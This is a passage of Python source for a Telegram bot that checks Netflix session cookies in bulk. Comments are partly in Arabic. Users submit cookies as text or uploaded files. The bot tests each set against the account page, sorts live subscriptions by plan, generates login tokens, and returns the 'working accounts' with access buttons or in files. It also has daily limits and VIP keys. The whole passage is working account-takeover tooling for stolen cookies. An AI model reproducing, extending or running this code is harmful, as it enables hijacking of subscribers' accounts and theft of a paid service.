🔢 Maximum per day: {MAX_CHECKS_PER_DAY}

🔄 Limit resets at midnight UTC

💡 Use /stats for more information
"""
    bot.reply_to(message, limit_text, parse_mode="HTML")

@bot.message_handler(commands=['cancel'])
def cancel_task(message: Message):
    chat_id = message.chat.id
    if chat_id in active_tasks and not active_tasks[chat_id]['cancel']:
        active_tasks[chat_id]['cancel'] = True
        bot.reply_to(message, "🛑 Task cancellation requested. Stopping thread gracefully...", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ No active tasks to cancel.", parse_mode="HTML")

# ==========================================
# معالج النصوص - للكوكيز المكتوبة مباشرة
# ==========================================
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_text_cookies(message: Message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text.startswith('/'):
        return
    
    if chat_id in active_tasks:
        bot.reply_to(message, "⚠️ A task is already running. Please wait for it to finish or use /cancel to stop it.", parse_mode="HTML")
        return
    
    user = message.from_user
    user_id = user.id
    
    # تسجيل المستخدم للـ broadcast
    known_users.add(user_id)
    
    can_check, remaining = can_user_check(user.id, user.username)
    if not can_check:
        bot.reply_to(message, f"⚠️ Daily limit reached!\n\nYou have used all {MAX_CHECKS_PER_DAY} checks for today.\nPlease try again tomorrow.\n\n🔄 Limit resets at midnight UTC.\n\n💡 Use /redeem <key> to get VIP access for 6 hours.", parse_mode="HTML")
        return
    
    if "NetflixId" in text or ".netflix.com" in text:
        bot.reply_to(message, "📥 Processing cookies from text... Results will appear as interactive messages.", parse_mode="HTML")
        
        bundles = extract_netflix_cookie_bundles(text)
        
        if not bundles:
            bot.reply_to(message, "❌ No valid cookies found in the text.\n\nMake sure the cookies are in Netscape format or contain NetflixId.", parse_mode="HTML")
            return
        
        increment_user_check(user.id, user.username)
        
        initial_stats = {'processed': 0, 'valid': 0, 'premium': 0, 'standard': 0, 'basic': 0, 'free': 0, 'invalid': 0}
        status_msg = bot.send_message(chat_id, build_status_message(initial_stats, len(bundles), time.time()), parse_mode="HTML")
        threading.Thread(target=process_file_in_thread, args=(chat_id, bundles, status_msg.message_id, True)).start()

def process_file_in_thread(chat_id, bundles, status_msg_id, is_text_input=False):
    active_tasks[chat_id] = {'cancel': False}
    total_cookies = len(bundles)
    
    stats = {
        'processed': 0, 'valid': 0, 'premium': 0, 'standard': 0, 
        'basic': 0, 'free': 0, 'invalid': 0
    }
    
    results_by_plan = {"Premium": [], "Standard": [], "Basic": [], "Mobile": []}
    session = requests.Session()
    start_time = time.time()
    last_update_time = time.time()

    for bundle in bundles:
        if active_tasks[chat_id]['cancel']: break
            
        stats['processed'] += 1
        netscape_content = bundle.get("netscape_text", "")
        cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
        
        if not cookies or not has_required_netflix_cookies(cookies):
            stats['invalid'] += 1
        else:
            session.cookies.clear()
            session.cookies.update(cookies)
            try:
                response_text, status_code, info = get_account_page(
                    session, request_timeout=BOT_CONFIG["performance"]["request_timeout_seconds"]
                )
                
                if status_code == 200 and info and (info.get("countryOfSignup") or info.get("membershipStatus")):
                    is_subscribed = is_subscribed_account(info)
                    
                    if is_subscribed:
                        stats['valid'] += 1
                        plan_key, _, _ = derive_output_plan_bucket(info, True)
                        nftoken_data, _ = create_nftoken(cookies)

                        if 'premium' in plan_key.lower():
                            stats['premium'] += 1
                            target_list = results_by_plan["Premium"]
                        elif 'standard' in plan_key.lower():
                            stats['standard'] += 1
                            target_list = results_by_plan["Standard"]
                        elif 'mobile' in plan_key.lower() or 'basic' in plan_key.lower():
                            stats['basic'] += 1
                            target_list = results_by_plan.get("Basic", results_by_plan["Mobile"])
                        else:
                            stats['basic'] += 1
                            target_list = results_by_plan["Basic"]
                        
                        if is_text_input:
                            account_text = format_for_telegram(info, True, nftoken_data)
                        else:
                            account_text = format_for_text_file(info, True, nftoken_data)
                        target_list.append((account_text, nftoken_data))
                    else:
                        stats['free'] += 1
                else:
                    stats['invalid'] += 1
            except Exception as e:
                print(f"Error processing: {e}")
                stats['invalid'] += 1

        if time.time() - last_update_time > 3:
            try:
                bot.edit_message_text(build_status_message(stats, total_cookies, start_time), chat_id, status_msg_id, parse_mode="HTML")
                last_update_time = time.time()
            except: pass

    try:
        final_text = ("🛑 Task Cancelled by User.\n\n" if active_tasks[chat_id]['cancel'] else "✅ Processing Complete!\n\n") + build_status_message(stats, total_cookies, start_time)
        bot.edit_message_text(final_text, chat_id, status_msg_id, parse_mode="HTML")
    except: pass

    if is_text_input:
        bot.send_message(chat_id, "📤 Sending results with interactive buttons...", parse_mode="HTML")
        
        accounts_sent = False
        
        if results_by_plan["Premium"]:
            accounts_sent = True
            bot.send_message(chat_id, f"👑 PREMIUM ACCOUNTS ({len(results_by_plan['Premium'])})\n{'='*30}", parse_mode="HTML")
            for i, (acc_text, nftoken_data) in enumerate(results_by_plan["Premium"], 1):
                keyboard = create_result_buttons(nftoken_data)
                if len(acc_text) > 3500:
                    parts = [acc_text[j:j+3500] for j in range(0, len(acc_text), 3500)]
                    for idx, part in enumerate(parts):
                        if idx == len(parts)-1:
                            bot.send_message(chat_id, f"📺 Premium #{i} (Part {idx+1}/{len(parts)})\n{part}", parse_mode="HTML", reply_markup=keyboard)
                        else:
                            bot.send_message(chat_id, f"📺 Premium #{i} (Part {idx+1}/{len(parts)})\n{part}", parse_mode="HTML")
                else:
                    bot.send_message(chat_id, f"📺 Premium #{i}\n{acc_text}", parse_mode="HTML", reply_markup=keyboard)
        
        if results_by_plan["Standard"]:
            accounts_sent = True
            bot.send_message(chat_id, f"🍿 STANDARD ACCOUNTS ({len(results_by_plan['Standard'])})\n{'='*30}", parse_mode="HTML")
            for i, (acc_text, nftoken_data) in enumerate(results_by_plan["Standard"], 1):
                keyboard = create_result_buttons(nftoken_data)
                if len(acc_text) > 3500:
                    parts = [acc_text[j:j+3500] for j in range(0, len(acc_text), 3500)]
                    for idx, part in enumerate(parts):
                        if idx == len(parts)-1:
                            bot.send_message(chat_id, f"📺 Standard #{i} (Part {idx+1}/{len(parts)})\n{part}", parse_mode="HTML", reply_markup=keyboard)
                        else:
                            bot.send_message(chat_id, f"📺 Standard #{i} (Part {idx+1}/{len(parts)})\n{part}", parse_mode="HTML")
                else:
                    bot.send_message(chat_id, f"📺 Standard #{i}\n{acc_text}", parse_mode="HTML", reply_markup=keyboard)
        
        if results_by_plan["Basic"] or results_by_plan["Mobile"]:
            all_basic = results_by_plan["Basic"] + results_by_plan["Mobile"]
            accounts_sent = True
            bot.send_message(chat_id, f"📱 BASIC/MOBILE ACCOUNTS ({len(all_basic)})\n{'='*30}", parse_mode="HTML")
            for i, (acc_text, nftoken_data) in enumerate(all_basic, 1):
                keyboard = create_result_buttons(nftoken_data)
                if len(acc_text) > 3500:
                    parts = [acc_text[j:j+3500] for j in range(0, len(acc_text), 3500)]
                    for idx, part in enumerate(parts):
                        if idx == len(parts)-1:
                            bot.send_message(chat_id, f"📺 Basic #{i} (Part {idx+1}/{len(parts)})\n{part}", parse_mode="HTML", reply_markup=keyboard)
                        else:
                            bot.send_message(chat_id, f"📺 Basic #{i} (Part {idx+1}/{len(parts)})\n{part}", parse_mode="HTML")
                else:
                    bot.send_message(chat_id, f"📺 Basic #{i}\n{acc_text}", parse_mode="HTML", reply_markup=keyboard)
        
        if not accounts_sent:
            bot.send_message(chat_id, "⚠️ No working accounts were found.", parse_mode="HTML")
    
    else:
        bot.send_message(chat_id, "📤 Sending your result files...", parse_mode="HTML")
        files_sent = False
        for plan_name, accounts in results_by_plan.items():
            if accounts:
                files_sent = True
                file_content = "\n\n\n\n".join([acc_text for acc_text, _ in accounts])
                doc = io.BytesIO(file_content.encode('utf-8', errors='replace'))
                doc.name = f"{plan_name.upper()}_ACCOUNTS.txt"
                bot.send_document(chat_id, doc, caption=f"📁 {plan_name.upper()} ACCOUNTS ({len(accounts)})", parse_mode="HTML")
        
        if not files_sent: 
            bot.send_message(chat_id, "⚠️ No working accounts were found.", parse_mode="HTML")
    
    if chat_id in active_tasks: 
        del active_tasks[chat_id]

@bot.message_handler(content_types=['document'])
def handle_docs(message: Message):
    chat_id = message.chat.id
    if chat_id in active_tasks:
        bot.reply_to(message, "⚠️ A task is already running. Please wait for it to finish or use /cancel to stop it.", parse_mode="HTML")
        return
    try:
        file_name = message.document.file_name.lower()
        if not file_name.endswith(('.txt', '.json', '.zip')):
            bot.reply_to(message, "❌ Invalid file format. Please send a `.txt`, `.json`, or `.zip` file.", parse_mode="HTML")
            return

        user = message.from_user
        user_id = user.id
        
        # تسجيل المستخدم للـ broadcast
        known_users.add(user_id)
        
        can_check, remaining = can_user_check(user.id, user.username)
        if not can_check:
            bot.reply_to(message, f"⚠️ Daily limit reached!\n\nYou have used all {MAX_CHECKS_PER_DAY} checks for today.\nPlease try again tomorrow.\n\n🔄 Limit resets at midnight UTC.\n\n💡 Use /redeem <key> to get VIP access for 6 hours.", parse_mode="HTML")
            return

        bot.reply_to(message, "📥 Loading file into memory... Please wait.", parse_mode="HTML")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = ""
        
        if file_name.endswith('.zip'):
            try:
                with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                    for name in z.namelist():
                        if name.lower().endswith(('.txt', '.json')) and not name.startswith('__MACOSX'):
                            with z.open(name) as f:
                                content += f.read().decode('utf-8', errors='ignore') + "\n"
            except:
                bot.reply_to(message, "❌ Error extracting ZIP file. Make sure it's valid.", parse_mode="HTML")
                return
        else: 
            content = downloaded_file.decode('utf-8', errors='ignore')

        bundles = extract_netflix_cookie_bundles(content)
        if not bundles:
            bot.reply_to(message, "❌ No valid cookies found in the file.", parse_mode="HTML")
            return

        increment_user_check(user.id, user.username)

        initial_stats = {'processed': 0, 'valid': 0, 'premium': 0, 'standard': 0, 'basic': 0, 'free': 0, 'invalid': 0}
        status_msg = bot.send_message(chat_id, build_status_message(initial_stats, len(bundles), time.time()), parse_mode="HTML")
        threading.Thread(target=process_file_in_thread, args=(chat_id, bundles, status_msg.message_id, False)).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An unexpected error occurred: {str(e)}", parse_mode="HTML")
        if chat_id in active_tasks: 
            del active_tasks[chat_id]

if __name__ == "__main__":
    setup_bot_commands()
    print("Bot is running ...")
    bot.infinity_polling()
